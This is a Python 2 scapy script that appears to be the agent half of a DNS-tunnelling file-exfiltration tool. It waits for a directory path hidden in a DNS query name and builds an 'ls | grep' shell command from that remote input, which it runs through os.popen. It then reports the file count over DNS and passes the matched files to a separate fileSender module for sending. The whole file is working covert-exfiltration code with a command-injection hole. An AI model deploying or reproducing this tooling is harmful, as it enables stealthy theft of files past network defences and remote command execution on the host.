from scapy.all import *

import fileSender

ip = "127.0.0.1"

dir_list = ""


def filterDirPath(dirPathPacket):
    if dirPathPacket.haslayer("IP"):
        if dirPathPacket[IP].dst == ip:
            if dirPathPacket.haslayer('UDP') and dirPathPacket.haslayer('DNS'):
                if dirPathPacket[UDP].dport == 53:
                    return True
    return False


def dnsAckFilter(pck):
    if pck.haslayer("IP") and pck[IP].dst == ip and \
            pck.haslayer("UDP") and pck.haslayer("DNSQR") and pck[UDP].dport == 53:
        if pck[DNSQR].qname == "OK.":
            return True
    return False


# Getting list of files
def waitForDirPath():
    print "Waiting for Directory path to be received..."
    pck = sniff(count=1, lfilter=filterDirPath)[0]
    print "Recieved, " + str(pck[DNSQR].qname)
    print "Getting list of files"
    dir_list = pck[DNSQR].qname

    return dir_list


# send number of files to server
def sendNumberOfFiles(length):
    print "Sending the number of files " + str(length)
    pck = IP(dst=ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=str(length)))
    send(pck, verbose=0)
    print "Waiting for Ack"
    sniff(count=1, lfilter=dnsAckFilter)
    print "Received Ack"
    time.sleep(2)


def main():
    dir_list = waitForDirPath()

    temp = dir_list.split('*')
    command = "ls {0} | grep {1}".format(temp[0], temp[1])[:-1]
    print command
    lst = os.popen(command).read().split('\n')
    lst.remove('')
    print "***"
    print lst
    print "***"

    sendNumberOfFiles(len(lst))

    print "Start Sending files...."
    fileSender.sendFiles(lst, temp)
    print "All files Sent...."


if __name__ == "__main__":
    main()
